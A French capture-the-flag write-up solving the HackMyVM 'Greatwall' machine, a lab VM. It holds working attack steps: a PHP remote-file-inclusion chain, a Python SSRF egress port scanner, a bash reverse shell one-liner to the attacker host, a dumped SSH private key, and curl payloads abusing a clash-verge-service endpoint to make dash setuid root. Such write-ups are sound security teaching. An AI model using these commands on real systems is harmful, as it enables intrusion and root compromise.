---
title: "Solution du CTF Greatwall de HackMyVM.eu"
tags: [CTF,HackMyVM]
---

### Captain Obvious

_Greatwall_ est un CTF proposé sur [HackMyVM.eu](https://hackmyvm.eu/machines/). Bien que marqué comme étant facile, l'escalade de privilège est compliquée, car il faut trouver des ressources concernant un logiciel chinois.

Toutes les infos sont disponibles, mais en chinois aussi, et les moteurs de recherche se faisant un malin plaisir à vous cantoner (jeu de mot !) dans vos préférences régionales, c'est un peu galère pour trouver quelque chose...

```console
$ sudo nmap -T5 -sCV --script vuln -p- 192.168.100.128
Starting Nmap 7.94SVN ( https://nmap.org )
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 192.168.100.128
Host is up (0.00042s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:9.2p1: 
|       PACKETSTORM:179290      10.0    https://vulners.com/packetstorm/PACKETSTORM:179290      *EXPLOIT*
|       95499236-C9FE-56A6-9D7D-E943A24B633A    10.0    https://vulners.com/githubexploit/95499236-C9FE-56A6-9D7D-E943A24B633A  *EXPLOIT*
|       5E6968B4-DBD6-57FA-BF6E-D9B2219DB27A    10.0    https://vulners.com/githubexploit/5E6968B4-DBD6-57FA-BF6E-D9B2219DB27A  *EXPLOIT*
|       56F97BB2-3DF6-5588-82AF-1D7B77F9AD45    10.0    https://vulners.com/githubexploit/56F97BB2-3DF6-5588-82AF-1D7B77F9AD45  *EXPLOIT*
--- snip ---
|       PACKETSTORM:140261      0.0     https://vulners.com/packetstorm/PACKETSTORM:140261      *EXPLOIT*
|       5C971D4B-2DD3-5894-9EC2-DAB952B4740D    0.0     https://vulners.com/githubexploit/5C971D4B-2DD3-5894-9EC2-DAB952B4740D  *EXPLOIT*
|_      39E70D1A-F5D8-59D5-A0CF-E73D9BAA3118    0.0     https://vulners.com/githubexploit/39E70D1A-F5D8-59D5-A0CF-E73D9BAA3118  *EXPLOIT*
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-fileupload-exploiter: 
|   
|_    Couldn't find a file-type field.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-server-header: Apache/2.4.62 (Debian)
| vulners: 
|   cpe:/a:apache:http_server:2.4.62: 
|       95499236-C9FE-56A6-9D7D-E943A24B633A    10.0    https://vulners.com/githubexploit/95499236-C9FE-56A6-9D7D-E943A24B633A  *EXPLOIT*
|       2C119FFA-ECE0-5E14-A4A4-354A2C38071A    10.0    https://vulners.com/githubexploit/2C119FFA-ECE0-5E14-A4A4-354A2C38071A  *EXPLOIT*
|       A5425A79-9D81-513A-9CC5-549D6321897C    9.8     https://vulners.com/githubexploit/A5425A79-9D81-513A-9CC5-549D6321897C  *EXPLOIT*
|       CVE-2025-53020  0.0     https://vulners.com/cve/CVE-2025-53020
|       CVE-2025-49812  0.0     https://vulners.com/cve/CVE-2025-49812
|       CVE-2025-49630  0.0     https://vulners.com/cve/CVE-2025-49630
|       CVE-2025-23048  0.0     https://vulners.com/cve/CVE-2025-23048
|       CVE-2024-47252  0.0     https://vulners.com/cve/CVE-2024-47252
|       CVE-2024-43394  0.0     https://vulners.com/cve/CVE-2024-43394
|       CVE-2024-43204  0.0     https://vulners.com/cve/CVE-2024-43204
|_      CVE-2024-42516  0.0     https://vulners.com/cve/CVE-2024-42516
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
MAC Address: 00:0C:29:87:34:57 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 115.88 seconds
```

La page d'index servie par Apache est un formulaire qui attend une URL.

Un titre indique `Across the Great Wall we can reach every corner in the world`.

Il semble évident que l'on aura à minima un SSRF, voire un directory traversal ou, dans le meilleur des cas, une inclusion distante.

Mon premier réflexe a été de demander un fichier avec le protocole `file://` : `http://192.168.100.128/?page=file%3A%2F%2F%2Fetc%2Fpasswd` :

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
wall:x:1000:1000:wall,,,:/home/wall:/bin/bash
```

Très bien !

Plus de tests montrent que sans le préfixe `file://`, ou si on utilise le préfixe `php://`, on obtient un message `nonono~`.

Si on demande de lire `/var/www/html/index.php` alors la page ne charge pas, comme si le serveur était dans une boucle infinie. Ça sent bien l'inclusion, quand même !

Mon intuition est confirmée en mettant en place un serveur web sur ma machine (en écoute sur le port 80) et en demandant au script vulnérable d'aller y chercher du code PHP.

Avec le RCE obtenu, je confirme le fonctionnement du script :

```php
<?php
if (isset($_GET['page'])) {
    $page = $_GET['page'];

    if (!preg_match('/^(file|https?):\/\//i', $page)) {
echo 'nonono~';
        return;
    }

    if (preg_match('/^https?:\/\/(www\.)?google\.com\/?$/i', $page)) {
        echo 'gulugulu~';
        return;
    }

    @include($page);
}
?>
```

Il semble que la machine ait des règles egress alors avec l'aide de l'IA Gemini, j'ai fait ce code Python qui va me permettre de voir les ports sortant autorisés :

```python
import asyncio
import httpx
import sys

TARGET_SSRF_HOST = "http://192.168.100.128"
TARGET_SSRF_PARAM = "page"
LISTEN_SCAN_HOST = "192.168.100.1"
PORTS_TO_SCAN = range(1, 65536)
CONCURRENT_REQUESTS = 100
TIMEOUT_SECONDS = 20

async def send_ssrf_request(client: httpx.AsyncClient, port: int):
    url = f"{TARGET_SSRF_HOST}/?{TARGET_SSRF_PARAM}=http://{LISTEN_SCAN_HOST}:{port}/"

    try:
        await client.get(url, timeout=TIMEOUT_SECONDS)
    except httpx.RequestError as exc:
        pass

async def main():
    sys.stdout.write(f"Lancement du scan de port via SSRF sur {TARGET_SSRF_HOST} pour cibler {LISTEN_SCAN_HOST}:FUZZ\n")
    sys.stdout.write(f"Ports à scanner : {min(PORTS_TO_SCAN)} à {max(PORTS_TO_SCAN)}\n")
    sys.stdout.write(f"Concurrence : {CONCURRENT_REQUESTS} requêtes à la fois\n")

    limits = httpx.Limits(max_connections=CONCURRENT_REQUESTS, max_keepalive_connections=20)
    async with httpx.AsyncClient(limits=limits) as client:
        tasks = []
        for port in PORTS_TO_SCAN:
            tasks.append(send_ssrf_request(client, port))

        total_ports = len(PORTS_TO_SCAN)
        processed_ports = 0

        for i in range(0, total_ports, CONCURRENT_REQUESTS):
            batch = tasks[i:i + CONCURRENT_REQUESTS]
            await asyncio.gather(*batch)
            processed_ports += len(batch)
            sys.stdout.write(f"Progression: {processed_ports}/{total_ports} ports traités.\r")
            sys.stdout.flush()

    sys.stdout.write("\nScan terminé !\n")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        sys.stdout.write("\nScan interrompu par l'utilisateur.\n")
    except Exception as e:
        sys.stdout.write(f"Une erreur inattendue est survenue: {e}\n")
```

Je mets l'interface réseau de VMWare en écoute et je n'ai pas à attendre très longtemps :

```console
$ sudo tshark -i vmnet1 -f "dst host 192.168.100.1 and not tcp port 80 and tcp[tcpflags] & tcp-syn != 0"
Running as user "root" and group "root". This could be dangerous.
Capturing on 'vmnet1'
    1 0.000000000 192.168.100.128 → 192.168.100.1 TCP 74 40346 → 22 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM TSval=2719262229 TSecr=0 WS=128 40346 22
```

Dans ma situation, cette règle est la bienvenue, car je peux continuer à utiliser mon port 80 pour charger les commandes PHP, downloader des fichiers, puis je ferais passer mon reverse shell sur le port 22.

Donc via le RCE PHP :

```bash
bash -i >& /dev/tcp/192.168.100.1/22 0>&1
```

Sur le port en écoute :

```console
$ sudo ncat -l -p 22 -v
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:22
Ncat: Listening on 0.0.0.0:22
Ncat: Connection from 192.168.100.128:50790.
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@greatwall:~/html$ ^Z
[1]+  Stopped                 sudo ncat -l -p 22 -v
$ stty raw -echo; fg
sudo ncat -l -p 22 -v
                     id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Give it to me

L'utilisateur courant a une permission pour exécuter `chmod` avec les droits de `wall` :

```console
www-data@greatwall:/tmp$ sudo -l
Matching Defaults entries for www-data on greatwall:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User www-data may run the following commands on greatwall:
    (wall) NOPASSWD: /bin/chmod
```

Je vais utiliser cette permission pour lire le flag et la clé privée SSH de l'utilisateur :

```console
www-data@greatwall:/tmp$ sudo -u wall chmod 755 /home/wall/
www-data@greatwall:/tmp$ cd /home/wall/                    
www-data@greatwall:/home/wall$ ls
user.flag
www-data@greatwall:/home/wall$ cat user.flag 
cat: user.flag: Permission denied
www-data@greatwall:/home/wall$ sudo -u wall chmod 644 user.flag  
www-data@greatwall:/home/wall$ cat user.flag 
                                                          .'.      
                                                      .':ldd.      
                                                  .,:oddddd:       
                                              .,cdddddddddd        
                                          .,cddddddddddddd:        
                                      .;lddddddddddddddddd.        
                                  .;lddddddddddddddddddddl         
                              .,cddddddddddddccoddddddddd.         
                          .;cdddddddddddddl,.:ddddddddddc          
                     .';lddddddddddddddo;. ,dddddddddddd.          
                 .':lddddddddddddddddc.  'oddddddddddddc           
             .':odddddddddddddddddl,   .cdddddddddddddd.           
         .':oddddddddddddddddddd:.    ;dddddddddddddddo            
      ';lddddddddddddddddddddl,     'odddddddddddddddd'            
       ..,:lodddddddddddddo;.     .cdddddddddddddddddl             
             ..';codddddc.      .:ddddddddddddddddddd.             
                    ..'        ,ddddddddddddddddddddc              
                              ;ldddddddddddddddddddd.              
                                 ..';clddddddddddddc               
                                        ..,:loddddd.               
                             .c:,..           ..',:                
                             'ddddd'                               
                             'dddl.                                
                             ,dd,                                  
                             ;o.                                   
                             .                                     

flag{b088764475fa2a0a962fb9154f41c5b6}
www-data@greatwall:/home/wall$ ls -a
.  ..  .bash_history  .bash_logout  .bashrc  .local  .profile  .ssh  user.flag
www-data@greatwall:/home/wall$ ls -al
total 32
drwxr-xr-x 4 wall wall 4096 May 11 02:41 .
drwxr-xr-x 3 root root 4096 May 10 18:54 ..
lrwxrwxrwx 1 root root    9 May 11 00:15 .bash_history -> /dev/null
-rwx------ 1 wall wall  220 May 10 18:54 .bash_logout
-rwx------ 1 wall wall 3526 May 10 18:54 .bashrc
drwx------ 3 wall wall 4096 May 11 00:18 .local
-rwx------ 1 wall wall  807 May 10 18:54 .profile
drwxr-xr-x 2 wall wall 4096 May 11 02:41 .ssh
-rw-r--r-- 1 wall wall 1808 May 11 00:25 user.flag
www-data@greatwall:/home/wall$ cd .ssh/
www-data@greatwall:/home/wall/.ssh$ ls
authorized_keys  id_rsa  id_rsa.pub
www-data@greatwall:/home/wall/.ssh$ ls -al
total 20
drwxr-xr-x 2 wall wall 4096 May 11 02:41 .
drwxr-xr-x 4 wall wall 4096 May 11 02:41 ..
-rw-r--r-- 1 wall wall  568 May 11 02:41 authorized_keys
-rw------- 1 wall wall 2602 May 11 02:41 id_rsa
-rw-r--r-- 1 wall wall  568 May 11 02:41 id_rsa.pub
www-data@greatwall:/home/wall/.ssh$ sudo -u wall chmod 644 id_rsa
www-data@greatwall:/home/wall/.ssh$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
www-data@greatwall:/home/wall/.ssh$ sudo -u wall chmod 600 id_rsa
```

### Qui veut la peau de mon crew ?

Une fois connecté sur ce compte à l'aide de la clé, je trouve une nouvelle entrée `sudo` :

```console
wall@greatwall:~$ sudo -l
Matching Defaults entries for wall on greatwall:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User wall may run the following commands on greatwall:
    (ALL) NOPASSWD: /usr/bin/systemctl start clash-verge-service
```

Ce service m'est totalement inconnu.

```console
wall@greatwall:~$ cat /etc/systemd/system/clash-verge-service.service
[Unit]
Description=Clash Verge Service helps to launch Clash Core.
After=network-online.target nftables.service iptables.service

[Service]
Type=simple
ExecStart=/usr/bin/clash-verge-service
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.targetw
```

Une recherche sur le web permet de retrouver ce projet :

[GitHub - clash-verge-rev/clash-verge-rev: A modern GUI client based on Tauri, designed to run in Windows, macOS and Linux for tailored proxy experience](https://github.com/clash-verge-rev/clash-verge-rev)

Un coup d'œil au binaire permet aussi de voir que c'est du Rust.

Le projet est un peu bizarre, car il se présente comme étant une GUI alors que là, on dispose d'un service.

Vu que l'on n'a aucun droit d'écriture sur les fichiers de l'application, il ne reste qu'à lancer le service.

```console
wall@greatwall:~$ sudo -u root /usr/bin/systemctl start clash-verge-service
wall@greatwall:~$ ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:0c:29:87:34:57 brd ff:ff:ff:ff:ff:ff
    altname enp2s1
    altname ens33
    inet 192.168.100.128/24 brd 192.168.100.255 scope global dynamic ens33
       valid_lft 969sec preferred_lft 969sec
    inet6 fe80::20c:29ff:fe87:3457/64 scope link 
       valid_lft forever preferred_lft forever
wall@greatwall:~$ ss -lntp
State                       Recv-Q                      Send-Q                                           Local Address:Port                                              Peer Address:Port                      Process                      
LISTEN                      0                           128                                                  127.0.0.1:33211                                                  0.0.0.0:*                                                      
LISTEN                      0                           128                                                    0.0.0.0:22                                                     0.0.0.0:*                                                      
LISTEN                      0                           128                                                       [::]:22                                                        [::]:*                                                      
LISTEN                      0                           511                                                          *:80                                                           *:* 
```

On a un port en plus, le `33211`. Bizarrement, je ne trouve pas ce port mentionné dans le répo sur Github mais on le retrouve dans certaines issues.

Je comprends que c'est un service REST, mais après énumération avec `ffuf`, je n'ai trouvé qu'un endpoint `version`.

En lisant le code, j'ai l'impression que je devrais trouver des endpoints `configs` ou `proxies` mais la réponse par défaut est toujours un 405. J'ai essayé avec la méthode HTTP `POST` et ce n'est pas mieux.

Vu la difficulté indiquée pour le challenge, ça semblait étrange de devoir investiguer autant. Je me suis donc tourné vers différents moteurs de recherche (duckduckgo, google, github).

D'abord, j'ai trouvé ce lien, mais c'était pour le moins flou. Il est quand même question d'une RCE :

[我是如何用ai帮我快速复现clash-verge-rev 0day的-魔法少女雪殇](https://www.snowywar.top/4595.html)

Via Github, j'ai trouvé cet article de blog :

[Exploiting Clash for Windows - 开放代理有多危险? · Ajax's Blog](https://aajax.top/2024/07/24/ExploitingCFW/#%E6%95%85%E4%BA%8B%E4%BB%8D%E5%9C%A8%E7%BB%A7%E7%BB%AD)

Il montre l'exploitation via un endpoint `start_clash`. L'exemple est pour Windows, alors j'ai adapté :

```console
wall@greatwall:~$ which dash
/usr/bin/dash
wall@greatwall:~$ echo -e '#!/bin/sh\nchmod 4755 /usr/bin/dash\n' > /tmp/script.sh
wall@greatwall:~$ chmod 755 /tmp/script.sh
wall@greatwall:~$ curl -X POST \
  http://127.0.0.1:33211/start_clash \
  -H 'Content-Type: application/json' \
  -d '{
    "core_type":"verge-mihome",
    "bin_path":"bash",
    "config_dir":"",
    "config_file":"/tmp/script.sh",
    "log_file":"/tmp/yolo.log"
  }'
{"code":0,"msg":"ok","data":null}
wall@greatwall:~$ ls -al /usr/bin/dash 
-rwxr-xr-x 1 root root 125640 Jan  5  2023 /usr/bin/dash
wall@greatwall:~$ cat /tmp/yolo.log
Spawning process: bash -d  -f /tmp/script.sh
```

Ça n'a pas fonctionné... Heureusement, on peut lire le fichier de log où on voit la commande que le service a tenté d'exécuter.

On voit qu'il a rajouté des paramètres `-d` et `-f` que `bash` n'a pas dû apprécier. On va directement passer notre script dans `bin_path` :

```console
wall@greatwall:~$ curl -X POST \
  http://127.0.0.1:33211/start_clash \
  -H 'Content-Type: application/json' \
  -d '{
    "core_type":"verge-mihome",
    "bin_path":"/tmp/script.sh",
    "config_dir":"",
    "config_file":"yolo",
    "log_file":"/tmp/yolo.log"
  }'
wall@greatwall:~$ ls -al /usr/bin/dash 
-rwsr-xr-x 1 root root 125640 Jan  5  2023 /usr/bin/dash
wall@greatwall:~$ dash -p
# cd /root
# ls
r007.7x7oZzZzZzzzz
# cat r007.7x7oZzZzZzzzz
                       ,'.                    ,',                   
                      ,''',.                .,'',                   
                      ,''''''              .'''''.                  
                     .''''''''............''''''';                  
                     ;''''''''''''''''''''''''''''                  
                     ''''''''''''''''''''''''''''',                 
                    ....'''''''''''''''''''''''...,                 
                    ,.....;xkl'...........'dkd,.....                
                    ,.....OMMM;...........cMMMd.....                
                   .......'cl,.............;l:.....;                
                   '.............':cc:,.............                
                   ,.................................               
                   .................................,               
                  ...................................               
                  ....................................              
         ....     ,..................................'              
        ...       ...................................,              
        ,..      .....................................              
        ...'     ......................................             
          ....   '.....................................             
             .........................................'             

flag{b3d2a9f34869484b74db97411cf1eb3b}
```
